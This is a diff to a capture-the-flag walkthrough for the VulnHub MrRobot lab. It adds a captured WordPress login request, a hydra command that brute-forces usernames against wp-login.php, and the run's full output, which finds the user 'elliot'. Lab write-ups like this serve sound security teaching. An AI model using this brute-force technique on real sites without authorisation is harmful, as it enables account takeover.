@@ -1501,17 +1501,66 @@ Now that we have our proxy in firefox configured and Burp Suite up and running w
 <img src="https://github.com/Shadow-Admins/Cyber_Club/blob/092dfd0dc511d5f8aa87c766ee31755da23a06a7/Starting_Point/VulnHub/MrRobot/images/wpburptest.png"><br>
 </div>
 <p></p>
-You should notice when you press log in nothing happens, its like the web page has frozen. Switch back to burp and you should see that the traffic has been captured, what is occuring is that burp suit is holding the request and it is waiting for you to actually send it (burp suit is a very big program and is a fairly steep learning curve so I would recomment doing a course on it, TryHackMe has a good one). Lets have a look at the internet traffic captured.
+You should notice when you press log in nothing happens, its like the web page has frozen (to continue using the internet you will need to turn of the proxy later otherwise all your internet traffic will be passed to burp [you can get around this by setting up targets in burp]). Switch back to burp and you should see that the traffic has been captured, what is occuring is that burp suit is holding the request and it is waiting for you to actually send it (burp suit is a very big program and is a fairly steep learning curve so I would recomment doing a course on it, TryHackMe has a good one). Lets have a look at the internet traffic captured.
 <p></p>
 <div align="center">
-<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/092dfd0dc511d5f8aa87c766ee31755da23a06a7/Starting_Point/VulnHub/MrRobot/images/wpburptest.png"><br>
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/cbc871b6a3741e70480fb88d9e74cf8268c74085/Starting_Point/VulnHub/MrRobot/images/wpburp.png"><br>
 </div>
 <p></p>
+Looking at this capture we can see that it was a POST request, and at the bottom we can see our test entries.
+<p></p>
 
+```
+log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.132%2Fwp-admin%2F&testcookie=1
+```
 
+<p></p>
+This is all the information we need IOT use hydra. Lets go back to our CLI and look at how we put this information into use.
+<p></p>
+Below is what the hydra command we will use to enumerate the user looks like, it looks very complex however hydra follows generally the same syntax all the time so you will become familiar with this as you continue to use it.
 
+```
+hydra -L uniq.dic -p whocares 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -t 40
+```
 
+<p></p>
+To start we use the <kbd>-L</kbd> flag to point to our dictionary we created earlier, (it is important that it is a capital, lowercase uses a single word to test while the capital points it to a file to try all the entries in a file, you can see this principal when you look at the next flag in this command).
+<p></p>
+The next flag we use is <kbd>-p</kbd> being lowercase it will only use the single word we are providing it "whocares".
+<p></p>
+The next item is the ip address or html address we want to brute force.
+<p></p>
+The next item is the information we pulled from our burp dump being the POST request, so here we enter http-post-form.
+<p></p>
+The final part of this command is the login information we pulled from burp. 
+<br>
+We start with the extention of the site /wp-login.php next we need to tell hydra where to insert the 'usernames' and 'passwords' we fed it at the start of the command, these go in the ^USER^ and ^PASS^ locations, basically hydra will keep putting each new item in this location and submitting the form untill it gets the return we want. 
+<p></p>
+We continue along untill we get to the "F=Invalid username" part of the command, what this is saying is this is the fail condition. That is whenever "Invalid username" is returned you have failed to look in, so anything different would be a successful login, we got this information from our tests on what was returned when we put test into the login boxes. I added the -t 40 to say run 40 strings against this command at once IOT speed up the brute force.
+<p></p>
+Running this command we get the following output:
+<p></p>
 
+```
+❯ hydra -L uniq.dic -p whocares 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -t 40
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 11:57:04
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 11452 login tries (l:11452/p:1), ~287 tries per task
+[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
+[STATUS] 1840.00 tries/min, 1840 tries in 00:01h, 9612 to do in 00:06h, 40 active
+[STATUS] 1080.00 tries/min, 3240 tries in 00:03h, 8212 to do in 00:08h, 40 active
+[80][http-post-form] host: 192.168.125.132   login: elliot   password: whocares
+[80][http-post-form] host: 192.168.125.132   login: Elliot   password: whocares
+[80][http-post-form] host: 192.168.125.132   login: ELLIOT   password: whocares
+[STATUS] 822.86 tries/min, 5760 tries in 00:07h, 5692 to do in 00:07h, 40 active
+[STATUS] 786.67 tries/min, 9440 tries in 00:12h, 2012 to do in 00:03h, 40 active
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 12:12:15
+
+```
+
+<p></p>
 
 
 
